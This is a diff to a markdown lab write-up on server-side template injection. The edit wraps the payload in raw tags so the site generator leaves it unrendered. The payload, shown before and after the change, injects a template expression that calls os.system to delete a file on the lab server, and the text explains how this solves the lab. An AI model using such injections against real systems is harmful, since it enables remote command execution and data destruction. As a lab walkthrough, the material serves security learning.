@@ -38,7 +38,10 @@ And that confirms, that's an SSTI right
 Ok, in order to solve the lab.. we need to delete a file which is `/home/carlos/morale.txt` and we can construct a payload like 
 
 ```liquid
-{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
+{% raw %}
+{% import os %}
+{{ os.system('rm /home/carlos/morale.txt') }}
+{% endraw %}
 ```
 
 which will use os library and executes the system command here to delete the file and send the request..
